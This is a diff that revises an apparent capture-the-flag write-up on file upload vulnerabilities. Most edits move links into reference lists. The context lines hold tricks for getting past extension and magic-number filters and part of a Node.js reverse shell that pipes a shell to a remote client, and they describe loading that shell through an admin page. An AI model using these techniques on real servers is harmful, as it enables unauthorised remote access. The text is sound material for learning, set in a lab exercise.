@@ -20,7 +20,8 @@ Modifying the file upload itself is much easier, as this can be done using Burp 
 Sending a file via curl is basically the same procedure as modify the file upload request, except that we let a good file go through so we can see the upload endpoint and then communicate with that directly.
 
 ```bash
-curl -X POST -F "submit=$SUBMIT_VALUE" -F "${FILE_INPUT NAME}=@$PATH_TO_FILE" $URL
+curl -X POST -F "submit=$SUBMIT_VALUE" \
+             -F "${FILE_INPUT NAME}=@$PATH_TO_FILE" $URL
 ```
 
 ### Bypassing Server-Side Filtering: File Extensions
@@ -31,7 +32,7 @@ The trick, of course, is not only that you need to upload your file, but that yo
 
 Note that sometimes developers just check to see if a valid extension exists within a file, so things like reverse-shell.jpg.php will work. Happy days if this is you.
 
-Common file extensions for [PHP](https://en.wikipedia.org/wiki/PHP):
+Common file extensions for PHP:
 
 * .php
 * .phar
@@ -39,6 +40,10 @@ Common file extensions for [PHP](https://en.wikipedia.org/wiki/PHP):
 * .pht
 * .phps (though I've always seen this as *source* code)
 * .php# (where `#` is the running PHP major version)
+
+References:
+
+* [PHP (Wikipedia)](https://en.wikipedia.org/wiki/PHP)
 
 ### Bypassing Server-Side Filtering: Magic Numbers
 
@@ -67,7 +72,7 @@ Potentially interesting directories in /content, /assets, /modules, /admin.
 
 The provided wordlist is combinations of three capital letters. The backgrounds files also follow this pattern (ABH.jpg, LKQ.jpg, SAD.jpg, UAD.jpg). All backgrounds are located in the /content directory (and the form says that uploaded files will be added to the slides), so I'll bet that this is where uploaded files go. I did one good upload (and then a scan with gobuster) to verify this.
 
-The server's response when loading a page indicates that it is running [Express](http://expressjs.com/). So we'll need a Node.js compatible reverse shell. I used the first option from the [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) (note that the port and IP address in line 6 need to be customized).
+The server's response when loading a page indicates that it is running Express. So we'll need a Node.js compatible reverse shell. I used the first option from the Reverse Shell Cheat Sheet (note that the port and IP address in line 6 need to be customized).
 
 ```javascript
 (function(){
@@ -80,7 +85,7 @@ The server's response when loading a page indicates that it is running [Express]
 		sh.stdout.pipe(client);
 		sh.stderr.pipe(client);
 	});
-	return /a/; // Prevents the Node.js application from crashing
+	return /a/; // Prevents Node.js from crashing
 })();
 ```
 
@@ -94,9 +99,13 @@ Initially I tried to add the relevant magic bytes to the front of my JS file wit
 
 Re-scanning the /content directory with gobuster for .js files revealed nothing, but rescanning for .jpg revealed that the server was renaming all files with the .jpg extension. Fortunately, the uploaded shell was so much smaller than either the pre-existing images or my uploaded test that it was easy to pick out
 
-THIS IS WHERE I GOT STUCK. I finally wound up looking at the [challenge hints](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/), most of which it turned out I'd already figured out. But Hint 9 suggested looking at the /admin page, which I hadn't bothered to try to visit. LET THAT BE A LESSON TO ME — POKE AROUND MORE!
+THIS IS WHERE I GOT STUCK. I finally wound up looking at the challenge hints, most of which it turned out I'd already figured out. But Hint 9 suggested looking at the /admin page, which I hadn't bothered to try to visit. LET THAT BE A LESSON TO ME — POKE AROUND MORE!
 
 The admin page indicates that it loads modules, so this is how we're going to get the Express app to execute the reverse shell (I'd been wondering how I was going to get it loaded into memory up until this point). Loading ../content/XKM.jpg (which is where my shell wound up) in this page resulted popped the shell, after which grabbing the flag was easy.
+
+* [Express](http://expressjs.com/)
+* [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+* [TryHackMe: File Upload Vulnerabilities — Hints](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/)
 
 - - - -
 
